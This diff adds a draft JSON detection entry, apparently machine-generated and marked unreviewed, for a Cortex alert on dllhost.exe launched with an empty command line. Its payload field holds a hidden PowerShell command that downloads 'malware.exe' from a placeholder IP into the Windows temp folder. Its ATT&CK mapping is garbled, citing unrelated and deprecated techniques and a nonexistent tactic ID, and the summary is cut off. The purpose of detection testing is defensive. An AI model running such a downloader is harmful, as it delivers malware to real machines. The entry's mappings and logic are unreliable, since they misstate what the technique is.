@@ -1,0 +1,179 @@
+{
+  "id": "TTP-0000-0085",
+  "schema_version": "1.0.0",
+  "entry_version": "0.1.0",
+  "status": "draft",
+  "metadata": {
+    "created_at": "2026-11-12T00:00:00Z",
+    "updated_at": "2026-11-12T00:00:00Z",
+    "authors": [
+      {
+        "name": "detdev pipeline (local model, unreviewed)",
+        "role": "generator"
+      }
+    ],
+    "tags": [
+      "generated-draft",
+      "platform-windows",
+      "endpoint",
+      "cortex-analytics-alert"
+    ],
+    "pov_engine": {
+      "auto_load": false,
+      "simulation_class": "endpoint",
+      "destructive": false,
+      "platforms": [
+        "windows"
+      ],
+      "cleanup_required": true,
+      "safety_class": "lab-only"
+    }
+  },
+  "identity": {
+    "name": "DLLHost Execution with Empty Command Line",
+    "summary": "An attacker executes dllhost.exe with an empty command line to bypass security controls and establish persistence. Cortex should detect this anomalous behavior as a potential sign of malicious activit",
+    "description": "An attacker executes dllhost.exe with an empty command line to bypass security controls and establish persistence. Cortex should detect this anomalous behavior as a potential sign of malicious activity. The attack involves spawning dllhost.exe with no arguments, which is unusual and indicative of a technique used for code execution or lateral movement."
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1059",
+        "subtechnique_id": "T1059.001",
+        "name": "Command and Scripting Interpreter: PowerShell",
+        "tactic_ids": [
+          "TA0002"
+        ],
+        "tactic_names": [
+          "Execution"
+        ]
+      },
+      {
+        "technique_id": "T1086",
+        "name": "T1086",
+        "tactic_ids": [
+          "TA0000"
+        ]
+      },
+      {
+        "technique_id": "T1546",
+        "subtechnique_id": "T1546.008",
+        "name": "T1546.008",
+        "tactic_ids": [
+          "TA0000"
+        ]
+      }
+    ]
+  },
+  "execution": {
+    "target_platform": "windows",
+    "execution_framework": "custom-cortex",
+    "privilege_required": "administrator",
+    "payload": {
+      "interpreter": "powershell",
+      "code": "powershell.exe -WindowStyle Hidden -Command \"[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; $client = New-Object System.Net.WebClient; $client.DownloadFile('http://192.0.2.10/malware.exe', 'C:\\Windows\\Temp\\malware.exe')\"\nstart-process -FilePath \"C:\\Windows\\System32\\dllhost.exe\" -ArgumentList \"\"\n",
+      "input_variables": [],
+      "timeout_seconds": 120
+    },
+    "expected_artifacts": [
+      {
+        "artifact_type": "process",
+        "description": "dllhost.exe started with empty command line",
+        "expected_value": "action_process_image_name = 'dllhost.exe' and action_process_command_line = ''"
+      }
+    ],
+    "cleanup": {
+      "manual_steps": [
+        "Not authored. Write and test cleanup before promotion."
+      ]
+    }
+  },
+  "detections": {
+    "biocs": [
+      {
+        "name": "Execution of dllhost.exe with empty command line",
+        "description": "Detection of dllhost.exe being executed with no arguments, which is highly suspicious and often used in malicious contexts.",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = 'dllhost.exe' and action_process_command_line = ''",
+        "mitre_technique_ids": [
+          "T1059.001",
+          "T1086",
+          "T1546.008"
+        ],
+        "severity": "high",
+        "suppression_window_seconds": 0
+      }
+    ],
+    "abiocs": [
+      {
+        "name": "Suspicious dllhost.exe execution with empty command line",
+        "description": "Behavioral deviation where dllhost.exe is executed without arguments, indicating a potential attempt at code execution or evasion.",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = 'dllhost.exe' and action_process_command_line = ''",
+        "behavioral_profile": "machine-learning",
+        "causality_anchor": "process_start",
+        "mitre_technique_ids": [
+          "T1059.001",
+          "T1086",
+          "T1546.008"
+        ],
+        "severity": "high"
+      }
+    ],
+    "xql_queries": [
+      {
+        "purpose": "validation",
+        "name": "Detect dllhost.exe with empty command line",
+        "query": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = 'dllhost.exe' and action_process_command_line = ''",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      }
+    ],
+    "correlation_rules": [],
+    "iocs": [],
+    "analytics_modules": [
+      "Cortex XSIAM Analytics (XDR Agent) — Execution of dllhost.exe with an empty command line; Required Data: XDR Agent. Ref: https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/execution-of-dllhost-exe-with-an-empty-command-line"
+    ]
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-xdr",
+        "submodule": "analytics",
+        "coverage_tier": "detection"
+      }
+    ]
+  },
+  "references": [
+    {
+      "title": "Cortex XDR Analytics Alert Reference: Execution of dllhost.exe with an empty command line",
+      "url": "https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/execution-of-dllhost-exe-with-an-empty-command-line",
+      "publisher": "Palo Alto Networks",
+      "primary": true
+    },
+    {
+      "title": "MITRE ATT&CK T1059.001",
+      "url": "https://attack.mitre.org/techniques/T1059/001/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1086",
+      "url": "https://attack.mitre.org/techniques/T1086/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1546.008",
+      "url": "https://attack.mitre.org/techniques/T1546/008/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    }
+  ],
+  "changelog": [
+    {
+      "entry_version": "0.1.0",
+      "date": "2026-11-12",
+      "author": "detdev pipeline (local model, unreviewed)",
+      "change": "Generated draft. Built from the model fragment and its recorded source only; not reviewed, not run."
+    }
+  ]
+}
